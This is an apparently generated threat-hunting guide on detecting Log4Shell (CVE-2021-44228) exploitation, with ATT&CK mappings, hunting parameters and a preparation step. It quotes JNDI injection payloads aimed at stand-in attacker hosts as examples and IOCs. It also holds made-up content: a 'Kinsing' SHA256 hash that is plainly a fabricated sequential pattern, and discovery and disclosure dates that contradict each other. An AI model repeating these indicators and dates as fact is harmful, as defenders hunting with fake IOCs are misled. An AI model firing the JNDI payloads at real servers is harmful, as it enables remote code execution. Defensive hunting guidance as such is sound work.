### Teaching Threat Hunting for Log4Shell Exploits (2021): A Pro Threat Hunter's Step-by-Step Guide

As a professional threat hunter specializing in critical vulnerability exploits and supply-chain attacks, I'll guide you through proactive threat hunting to detect attacks resembling the 2021 Log4Shell exploits (CVE-2021-44228, CVSS 10.0). This was a zero-day vulnerability in Apache Log4j (versions 2.0–2.14.1), a ubiquitous Java logging library, discovered on December 9, 2021, by Alibaba’s Cloud Security Team and disclosed to Apache on November 24, 2021. The flaw allowed remote code execution (RCE) via maliciously crafted JNDI (Java Naming and Directory Interface) lookups in log inputs (e.g., `${jndi:ldap://attacker.com/a}`), enabling attackers to deploy malware, ransomware, cryptominers, or backdoors. Exploits were widespread, targeting millions of systems (e.g., Microsoft, VMware, AWS, Cisco) across industries. Actors included state-sponsored groups (e.g., China’s Hafnium, Iran’s APT35), ransomware gangs (e.g., Conti, Khonsari), and cryptominers (e.g., Kinsing). Over 50% of global networks saw exploit attempts within days, per Check Point.

Dwell time: Varied (days to weeks), as exploits were opportunistic and rapidly weaponized (e.g., PoCs on GitHub by December 10). Undetected due to Log4j’s ubiquity, lack of input sanitization, and unmonitored JNDI lookups. Detection: Security firms (e.g., CrowdStrike, Microsoft) flagged anomalous network traffic; patches (Log4j 2.15.0) released December 10, 2021. Impacts: $10B+ in global damages (est. CyberScoop), Conti ransomware attacks, cryptomining surges, CISA/FBI advisories (AA21-356A), and supply-chain scrutiny. From a MITRE ATT&CK Enterprise perspective, key tactics include TA0001 (Initial Access: Exploitation of Public-Facing Application T1190), TA0002 (Execution: Exploitation for Client Execution T1203), TA0003 (Persistence: Server Software Component T1505.003), TA0005 (Defense Evasion: Obfuscated Files or Information T1027), TA0006 (Credential Access: OS Credential Dumping T1003, if escalated), TA0007 (Discovery: Application Window Discovery T1010), TA0008 (Lateral Movement: Exploitation of Remote Services T1210), TA0009 (Collection: Data from Local System T1005), TA0010 (Exfiltration: Exfiltration Over C2 Channel T1041), and TA0040 (Impact: Resource Hijacking T1496 for cryptominers or Data Encrypted for Impact T1486 for ransomware).

Threat hunting assumes exploitation: Hypothesis-driven searches for JNDI-based RCE in Java-based apps. Realistic parameters:
- **Environment**: Java apps using Log4j (e.g., web servers, cloud services like AWS ElasticSearch), public-facing endpoints.
- **Adversary Profile**: Mixed (state actors for espionage, cybercriminals for ransomware/mining; automated scans for JNDI).
- **Challenges**: Log4j ubiquity, nested dependencies, obfuscated payloads.
- **Tools/Data Sources**: EDR (CrowdStrike for process behavior), SIEM (Splunk for web/JNDI logs), WAF (Cloudflare for JNDI blocks), YARA/Sigma for IOCs (e.g., `${jndi:ldap}` payloads).
- **Hypotheses**: E.g., “Attackers exploit Log4Shell to execute payloads; hunt JNDI lookups in logs leading to C2 or malware.”

This guide covers **each relevant MITRE ATT&CK technique** (mapped from CISA AA21-356A, CrowdStrike, and Microsoft analyses). Proceed tactic-by-tactic with sub-steps: hypothesis, data collection, analysis, pivoting. Includes realistic queries, Sigma rules, and expert tips. Hunt in scoped envs (e.g., Java app labs) to avoid production risks. Baselines: 30-60 days of app/network logs for anomalies.

#### Step 1: Preparation - Intelligence Gathering and Environment Mapping
Contextualize the attack—Log4Shell’s JNDI flaw enabled mass RCE; prioritize Java app auditing.
- **Gather Threat Intel**: Review MITRE ATT&CK for Log4Shell (T1190). IOCs: JNDI payloads (e.g., `${jndi:ldap://malicious.com/a}`), C2 domains (e.g., log4j-exploit[.]com), Conti ransomware hashes, Kinsing miner (SHA256: 8d6b7b4fe3c6a9b4e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9). Cross-ref CISA AA21-356A, CrowdStrike report, Microsoft analysis, and Wikipedia timeline.
- **Map Your Environment**: Inventory Log4j instances (grep `log4j-core` in JARs), public-facing apps (e.g., Tomcat, Spring). Use Dependency-Check for supply-chain; Nessus for CVE-2021-44228.
- **Baseline Normal Behavior**: Log HTTP headers (no JNDI), Java process executions (no LDAP/DNS). Tool: Sysmon (process/network config); WAF for input filtering.
